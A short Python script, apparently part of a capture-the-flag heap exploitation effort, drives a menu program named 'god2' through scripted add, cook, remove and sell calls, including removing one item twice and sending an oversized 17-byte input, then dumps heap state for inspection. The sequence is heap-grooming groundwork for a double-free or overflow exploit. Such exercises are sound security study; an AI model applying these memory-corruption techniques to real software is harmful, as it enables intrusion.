import sys,os; sys.path.insert(0,"/mnt/c/Users/ha/Downloads/pwn")
from dumper import G
NF=int(sys.argv[1]) if len(sys.argv)>1 else 5
g=G("god2")
g.add(b"UNIQ777"); g.add(b"A1"); g.add(b"B2"); g.cook(b"Beef noodles"); g.add(b"YY"); g.add(b"Z9"); g.cook(b"Beef noodles")
for t in (b"B2",b"Z9",b"A1",b"YY"): g.rm(t)
g.add(b"CC"); g.cook(b"Beef noodles"); g.cook(b"Beef noodles"); g.cook(b"UNIQ777")
g.rm(b"UNIQ777"); g.rm(b"UNIQ777"); g.sell(b"2"); g.sell(b"3")
for i in range(NF): g.make(b"f%d_xxxxxx"%i)
g.add(b"R"*16+b"A"); g.add(b"FD1111"); g.add(b"SLOT22")
g.dump("dd6 + %d foods + R,FD,SLOT"%NF); g.close()
